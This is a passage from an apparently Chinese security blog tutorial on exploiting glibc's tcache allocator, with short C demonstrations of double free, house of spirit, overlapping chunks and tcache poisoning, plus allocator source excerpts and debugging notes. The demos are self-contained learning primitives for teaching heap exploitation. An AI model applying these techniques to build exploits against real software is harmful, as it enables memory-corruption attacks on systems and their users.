+<h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>通过 <code>free</code> 2次同一个 <code>chunk</code> ， 使得可以让两个指针分配到同一块内存</p>
+<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdint.h&gt;</div><div class="line"></div><div class="line">int main() &#123;</div><div class="line">        void* p1 = malloc(0x40);</div><div class="line">        free(p1);</div><div class="line">        free(p1);</div><div class="line">        printf(&quot;Next allocated memory will be same: %p %p\n&quot;, malloc(0x40), malloc(0x40));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<ul>
+<li>通过  <code>_int_free</code> 的源码我们知道， 在 <code>free</code> 的时候，会检测  <code>p</code>  的下一个 <code>chunk</code> ( <code>next</code> ) 的 <code>PREV_INUSE</code> 位</li>
+<li>然后如果 <code>tcache</code> 指定项没有满就把 <code>chunk</code> 加入 <code>tcache</code></li>
+<li>但是如果 <code>chunk</code> 被放入了 <code>tcache</code> ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></li>
+</ul>
+<p>所以我们释放两次 <code>p1</code> , 此时 <code>tcache</code> 里面 <code>size</code> 为 <code>0x50</code>  ( <code>chunk</code> 大小)  的项中就有 两个 一样  <code>chunk</code> </p>
+<p><img src="assets/1525346996753.png" alt="1525346996753"></p>
+<p>然后分配两次一样大小的 <code>chunk</code>， <code>malloc</code> 会先用 <code>tcache</code> 分配，就会拿到两个一样的 <code>chunk</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">01:38 haclh@ubuntu:tcache_pwn $ ./tcache_dup </div><div class="line">Next allocated memory will be same: 0x602260 0x602260</div></pre></td></tr></table></figure>
+<p>可以看到分配到了两个地址一样的 <code>chunk</code> .</p>
+<h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>通过伪造 <code>size</code> ，然后 <code>free</code> 掉这个 伪造的 <code>chunk</code> , 然后再分配 <code>size</code> 大小的 <code>chunk</code> , 就可以分配到指定位置。</p>
+<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><p>首先看看源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">#include &lt;stddef.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdint.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int main(int argc, const char* argv[]) &#123;</div><div class="line">    size_t fake_chunk_and_more[64];</div><div class="line">    memset(fake_chunk_and_more, &apos;A&apos;, sizeof(fake_chunk_and_more));</div><div class="line">    printf(&quot;stack buf: %p\n&quot;, (void *)fake_chunk_and_more);</div><div class="line">    </div><div class="line">    char* fake_chunk = (char * )fake_chunk_and_more;</div><div class="line">    *(long *)(fake_chunk + sizeof(long)) = 0x110;</div><div class="line"></div><div class="line">    *(long *)(fake_chunk + 0x110 + sizeof(long)) = 0x40;  // 设置 pre_inused 位</div><div class="line">    char *mem = fake_chunk + 2*sizeof(long);</div><div class="line">    free(mem);</div><div class="line">    </div><div class="line">    void *mem2 = malloc(0x100);</div><div class="line">    printf(&quot;malloc(0x100) returned: %p\n&quot;, mem2);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>就是在栈上面（用栈只是为了方便）伪造了 一个 <code>0x110</code> 大小 <code>chunk</code>，</p>
+<p><img src="assets/1525346826868.png" alt="1525346826868"></p>
+<p>然后把它释放掉，他就会进入 <code>tcache</code>  ,然后分配 <code>0x110</code> 的 <code>chunk</code> 就可以 分配到 <code>fake_chunk_and_more</code> 的地址</p>
+<p><img src="assets/1525339347203.png" alt="1525339347203"></p>
+<p>可以看到分配到了<code>fake_chunk_and_more</code> .</p>
+<p> 调试过程的内存状态</p>
+<p><img src="assets/1525339467768.png" alt="1525339467768"></p>
+<p>熟悉 <code>malloc</code> 管理机制的老哥们可以比较奇怪，这里把 <code>next_chunk-&gt;pre_inused = 0</code>   (  <code>size = 0x40</code>  )  。</p>
+<p>在 源码里面是有通过  <code>check_inuse_chunk</code> 检测是否 <code>double free</code> 的 代码的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">_int_free (mstate av, mchunkptr p, int have_lock)</div><div class="line">&#123;</div><div class="line">  size = chunksize (p);</div><div class="line">  ....................................................</div><div class="line">  ....................................................</div><div class="line">  check_inuse_chunk(av, p);</div><div class="line">  #if USE_TCACHE</div><div class="line">  &#123;</div><div class="line">    size_t tc_idx = csize2tidx (size);  // tcache bin 的索引</div><div class="line">    if (tcache</div><div class="line">	&amp;&amp; tc_idx &lt; mp_.tcache_bins  // 64 ，最多 64 个 bin</div><div class="line">	&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  // 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</div><div class="line">      &#123;</div><div class="line">	tcache_put (p, tc_idx);</div><div class="line">	return;</div><div class="line">      &#125;</div><div class="line">  &#125;</div><div class="line">#endif</div></pre></td></tr></table></figure>
+<p>但是从 <code>ida</code> 里面去看，居然不见了，校验 <code>chunk</code> 的 <code>size</code> 和 指针 后就直接进入 <code>tcache</code> 的处理的流程， 于是这里就算设置 下一个<code>chunk</code> 的 <code>next_chunk-&gt;pre_inuse = 0</code> ,也不会出现 <code>crash</code> 。</p>
+<p><img src="assets/1525338185257.png" alt="1525338185257"></p>
+<h2 id="overlapping-chunks-by-caching"><a href="#overlapping-chunks-by-caching" class="headerlink" title="overlapping_chunks_by_caching"></a>overlapping_chunks_by_caching</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p><code>overlapping_chunks</code>  这种技术非常经典了， 不过在 <code>tcache</code> 里面就非常的简单了， 修改 <code>chunk</code> 的 <code>size</code> 为 <code>fake_size</code> ， 然后  <code>free</code> 掉它，就会进入 <code>fake_size</code> 对应的  <code>tcache</code> ， 然后在 分配  <code>fake_size</code>  的 <code>chunk</code> 就可以拿到这个 <code>chunk</code> ,  <strong>overlap chunk</strong></p>
+<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">#include &lt;stddef.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdint.h&gt;</div><div class="line">int main(int argc, const char* argv[]) &#123;</div><div class="line">    char *mem = malloc(0x48);</div><div class="line">    char *sentry = malloc(0x18);</div><div class="line">    memset(sentry, &apos;b&apos;, 0x10);</div><div class="line">    printf(&quot;mem: %p, sentry: %p\n&quot;,mem, sentry);</div><div class="line">    printf(&quot;sentry content: %s\n&quot;, sentry);</div><div class="line">    *(long* )(mem - sizeof(long)) = 0x110;  // 设置 chunk-&gt;size = 0x110</div><div class="line">    free(mem);</div><div class="line">    char *mem2 = malloc(0x100);  // 分配一个 0x110 的chunk</div><div class="line">    memset(mem2, &apos;a&apos;, 0x100);</div><div class="line">    printf(&quot;mem2: %p\n&quot;, mem2);</div><div class="line">    printf(&quot;sentry content: %s\n&quot;, sentry);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>通过修改 <code>mem</code> 所在 <code>chunk</code> 的 <code>size</code> 为  <code>0x110</code> </p>
+<p><img src="assets/1525347324312.png" alt="1525347324312"></p>
+<p>然后释放掉他 ，然后分配一个 <code>0x110</code> 的 <code>chunk</code> ，我们就会再次分配到它。此时 <code>mem2</code> 的 <code>chunk</code> 包含了 <code>sentry</code> 的 <code>chunk</code></p>
+<p><img src="assets/1525340874047.png" alt="1525340874047"></p>
+<p>调试过程</p>
+<p><img src="assets/1525340838481.png" alt="1525340838481"></p>
+<p>可以看到 <code>mem2</code> 所在 <code>chunk</code> 的大小为 <code>0x110</code>， 而 <code>sentry</code> 和 <code>mem2</code> 相距 <code>0x50</code>  于是可以通过 <code>mem2</code> 修改 <code>sentry</code> 的内容</p>
+<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>通过修改 <code>free</code> 状态的 <code>tcache</code> 里面的 <code>chunk</code> 的 <code>fd</code>  （其实就是 <code>tcache_entry-&gt;next</code> ) ，可以分配到任意地址</p>
+<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#include &lt;malloc.h&gt;</div><div class="line">#include &lt;stddef.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdint.h&gt;</div><div class="line">int main(int argc, const char* argv[]) &#123;</div><div class="line">    size_t target[6];</div><div class="line">    printf(&quot;stack: %p\n&quot;,target);</div><div class="line">    char *mem = malloc(0x48);</div><div class="line">    free(mem);</div><div class="line">    *(long *)(mem) = (long)target; </div><div class="line">    char *mem1 = malloc(0x48);</div><div class="line">    char *mem2 = malloc(0x48);</div><div class="line">    printf(&quot;mem2: %p\n&quot;, mem2);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>分配一个 <code>0x50</code> 的 <code>chunk</code> 然后释放它，进入 <code>tcache</code> ，然后修改 <code>fd</code> 为 <code>target</code> </p>
+<p><img src="assets/1525347583081.png" alt="1525347583081"></p>
+<p>然后分配两次 <code>0x50</code> 的 <code>chunk</code> 就可以分配到 <code>target</code></p>
+<p><img src="assets/1525344303155.png" alt="1525344303155"></p>
+<p>成功分配到了 栈上面。</p>
+<p>其实 <code>fd</code> 为任意地址都行，原因在于  <code>tcache_get</code>  直接从 <code>tcache-&gt;entries</code> 里面拿 <code>chunk</code> ， 而不检查 拿到的 <code>chunk</code> 是否合法。</p>
+<p>同时 在 <code>malloc</code> 分配内存时，首先使用 <code>tcache</code> ，而它判断 <code>tcache</code> 有没有可以分配的 <code>chunk</code> , 是直接判断指定项有没有指针。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">  DIAG_PUSH_NEEDS_COMMENT;</div><div class="line">  if (tc_idx &lt; mp_.tcache_bins</div><div class="line">      &amp;&amp; tcache</div><div class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) // 根据tcache-&gt;entries[tc_idx]是否为空判断是否有chunk</div><div class="line">    &#123;</div><div class="line">      return tcache_get (tc_idx);</div><div class="line">    &#125;</div><div class="line">  DIAG_POP_NEEDS_COMMENT;</div><div class="line">#endif</div></pre></td></tr></table></figure>
+<h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p><code>tcache</code> 的引入使得 <code>heap</code> 相关的漏洞的利用非常的简单了。</p>
+<p>简单的原因主要在于 <code>tcache</code> 里面没有做什么检查， 同时还会优先使用这使得原来 <code>malloc</code> 里面的 <code>check</code> 也没有了作用。</p>
+<p><code>free</code> 的话 释放内存如果大小在 <code>tcache</code> 的范围内， 只检测 <strong>size 和 指针</strong> 是否合法，而且检测非常弱。</p>
+<p><code>malloc</code> 时 也是优先使用 <code>tcache</code> ， 只要 <code>tcache-&gt;entries[tc_idx]</code> 非空就可以从 <code>tcache</code> 分配。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="external">http://tukan.farm/2017/07/08/tcache/</a></p>
+<p><a href="https://www.anquanke.com/post/id/104760" target="_blank" rel="external">https://www.anquanke.com/post/id/104760</a></p>
+
+        
+                <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
+                    <p><strong>
+                         
+                            <a>本站文章均原创， 转载注明来源</a>
+                        </strong>
+                        <br>
+                        <strong>本文链接：</strong><a href="http://blog.hac425.top/2018/06/03/Pwn-Heap-With-Tcache.html">http://blog.hac425.top/2018/06/03/Pwn-Heap-With-Tcache.html</a>
+                    </p>
+                </blockquote>
+        
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+    <!-- 使用 来必力 -->
+<div id="livere-comment">
+    <!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zMTQ2OC84MDMy">
+<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+</script>
+<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 -->
+</div>
+<style>
+    #livere-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2018/06/03/fuzz_with_honggfuzz.html" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
+
+
+                    
+                        <!-- Overlay For Active Sidebar -->
+<div class="sidebar-overlay"></div>
+
+<!-- Material sidebar -->
+<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
+    <div id="sidebar-main">
+        <!-- Sidebar Header -->
+        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
+    <!-- Top bar -->
+    <div class="top-bar"></div>
+
+    <!-- Sidebar toggle button -->
+    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
+        <i class="material-icons">clear_all</i>
+        <span class="mdl-button__ripple-container">
+            <span class="mdl-ripple">
+            </span>
+        </span>
+    </button>
+
+    <!-- Sidebar Avatar -->
+    <div class="sidebar-image">
+        <img src="/img/girl.png" alt="hac425's avatar">
+    </div>
+
+    <!-- Sidebar Email -->
+    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
+        hac425xxx@gmail.com
+        <b class="caret"></b>
+    </a>
+</div>
+
+
+        <!-- Sidebar Navigation  -->
+        <ul class="nav sidebar-nav">
+    <!-- User dropdown  -->
+    <li class="dropdown">
+        <ul id="settings-dropdown" class="dropdown-menu">
+            
+                <li>
+                    <a href="#" target="_blank" title="Email Me">
+                        
+                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
+                        
+                        Email Me
+                    </a>
+                </li>
+            
+        </ul>
+    </li>
+
+    <!-- Homepage -->
+    
+        <li id="sidebar-first-li">
+            <a href="/">
+                
+                    <i class="material-icons sidebar-material-icons">home</i>
+                
+                主页
+            </a>
+        </li>
+        
+    
+
+    <!-- Archives  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">inbox</i>
+                
+                    归档
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/archives/2018/06/">六月 2018<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">7</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">14</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/02/">二月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/01/">一月 2018<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">13</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/11/">十一月 2017<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/10/">十月 2017<span class="sidebar_archives-count">11</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/08/">八月 2017<span class="sidebar_archives-count">1</span></a>
+            </ul>
+        </li>
+        
+    
+
+    <!-- Categories  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">chrome_reader_mode</i>
+                
+                分类
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+                <li>
+                <a class="sidebar_archives-link" href="/categories/Vulnerability-analysis/">Vulnerability analysis<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/chrome/">chrome<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/ctf/">ctf<span class="sidebar_archives-count">21</span></a></li><li><a class="sidebar_archives-link" href="/categories/embedded-development/">embedded_development<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/fuzz/">fuzz<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/categories/java应用破解思路/">java应用破解思路<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/jeb破解/">jeb破解<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/kernel/">kernel<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/pwn-router-os/">pwn_router_os<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/categories/reverse/">reverse<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/vulnerability-report/">vulnerability_report<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/代码审计/">代码审计<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/categories/安卓安全/">安卓安全<span class="sidebar_archives-count">6</span></a></li><li><a class="sidebar_archives-link" href="/categories/文件patch/">文件patch<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/渗透测试/">渗透测试<span class="sidebar_archives-count">11</span></a></li><li><a class="sidebar_archives-link" href="/categories/破解/">破解<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/路由器安全/">路由器安全<span class="sidebar_archives-count">11</span></a>
+            </ul>
+        </li>
+        
+            <li class="divider"></li>
+        
+    
+
+    <!-- Pages  -->
+    
+        <li>
+            <a href="/about" title="关于我">
+                
+                    <i class="material-icons sidebar-material-icons">person</i>
+                
+                关于我
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/timeline" title="时间轴">
+                
+                    <i class="material-icons sidebar-material-icons">timeline</i>
+                
+                时间轴
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/links" title="友情链接">
+                
+                    <i class="material-icons sidebar-material-icons">people</i>
+                
+                友情链接
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/tags" title="标签云">
+                
+                    <i class="material-icons sidebar-material-icons">invert_colors</i>
+                
+                标签云
+            </a>
+        </li>
+        
+    
+
+    <!-- Article Number  -->
+    
+        <li>
+            <a href="/archives">
+                文章总数
+                <span class="sidebar-badge">71</span>
+            </a>
+        </li>
+        
+    
+</ul>
+
+
+        <!-- Sidebar Footer -->
+        <!--
+I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
+If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
+It will not impact the appearance and can give developers a lot of support :)
+
+很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
+如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
+它不会影响美观并可以给开发者很大的支持和动力。 :)
+-->
+
+<!-- Sidebar Divider -->
+
+
+<!-- Theme Material -->
+
+
+<!-- Help & Support -->
+<!--
+
+-->
+
+<!-- Feedback -->
+<!--
+
+-->
+
+<!-- About Theme -->
+<!--
+
+-->
+
+    </div>
+
+    <!-- Sidebar Image -->
+    
+
+</aside>
+
+                    
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
+
+                    
+
+                    <script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+<!--Footer-->
+<footer class="mdl-mini-footer" id="bottom">
+    
+        <!-- Paradox Footer Left Section -->
+        <div class="mdl-mini-footer--left-section sns-list">
+    <!-- Twitter -->
+    
+        <a href="https://twitter.com/hac425" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
+                <span class="visuallyhidden">Twitter</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Facebook -->
+    
+
+    <!-- Google + -->
+    
+
+    <!-- Weibo -->
+    
+        <a href="http://weibo.com/u/5691483590" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-weibo">
+                <span class="visuallyhidden">Weibo</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Instagram -->
+    
+
+    <!-- Tumblr -->
+    
+
+    <!-- Github -->
+    
+        <a href="https://gitee.com/hac425/" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-github">
+                <span class="visuallyhidden">Github</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- LinkedIn -->
+    
+
+    <!-- Zhihu -->
+    
+
+    <!-- Bilibili -->
+    
+
+    <!-- Telegram -->
+    
+    
+    <!-- V2EX -->
+    
+</div>
+
+
+        <!--Copyright-->
+        <div id="copyright">
+            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>穷则变，变则通，通则久
+            
+        </div>
+
+        <!-- Paradox Footer Right Section -->
+
+    
+</footer>
+
+
+                    <!-- Import JS File -->
+
+    <script>lsloader.load("lazyload_js","/js/lazyload.min.js?wgjW/HuQG9JDgvPDPoRAng==", true)</script>
+
+
+
+    <script>lsloader.load("js_js","/js/js.min.js?V/53wGualMuiPM3xoetD5Q==", true)</script>
+
+
+
+    <script>lsloader.load("np_js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==", true)</script>
+
+
+<script type="text/ls-javascript" id="NProgress-script">
+    NProgress.configure({
+        showSpinner: true
+    });
+    NProgress.start();
+    $('#nprogress .bar').css({
+        'background': '#29d'
+    });
+    $('#nprogress .peg').css({
+        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
+    });
+    $('#nprogress .spinner-icon').css({
+        'border-top-color': '#29d',
+        'border-left-color': '#29d'
+    });
+    setTimeout(function() {
+        NProgress.done();
+        $('.fade').removeClass('out');
+    }, 800);
+</script>
+
+
+
+
+
+
+
+    <!-- Busuanzi -->
+    <script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+   
+
+
+
+
+
+<!-- UC Browser Compatible -->
+<script>
+	var agent = navigator.userAgent.toLowerCase();
+	if(agent.indexOf('ucbrowser')>0) {
+		document.write('<link rel="stylesheet" href="/css/uc.css">');
+	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
+	}
+</script>
+
+<!-- Import prettify js  -->
+
+
+    
+        <script>lsloader.load("hanabi","/js/hanabi-browser-bundle.js?5+2z7ZZmFuZK5IcimlZbxw==", true)</script>
+    
+
+
+<!-- Window Load -->
+<!-- add class for prettify -->
+<script type="text/ls-javascript" id="window-load">
+    $(window).on('load', function() {
+        // Post_Toc parent position fixed
+        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
+    });
+
+    
+    
+        
+        
+        HanabiBrowser.start('pre code',true);
+    
+</script>
+
+<!-- MathJax Load-->
+
+
+<!-- Bing Background -->
+
+
+<script type="text/ls-javascript" id="lazy-load">
+    // Offer LazyLoad
+    queue.offer(function(){
+        $('.lazy').lazyload({
+            effect : 'show'
+        });
+    });
+
+    // Start Queue
+    $(document).ready(function(){
+        setInterval(function(){
+            queue.execNext();
+        },200);
+    });
+</script>
+
+<!-- Custom Footer -->
+
+
+
+<script>
+    (function(){
+        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
+
+        for (var i = 0; i < scriptList.length; ++i) {
+            var item = scriptList[i];
+            lsloader.runInlineScript(item.id,item.id);
+        }
+    })()
+console.log('\n %c © Material Theme | Version: 1.5.0 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
+</script>
+
+                </main>
+            </div>
+        </body>
+    
+</html>
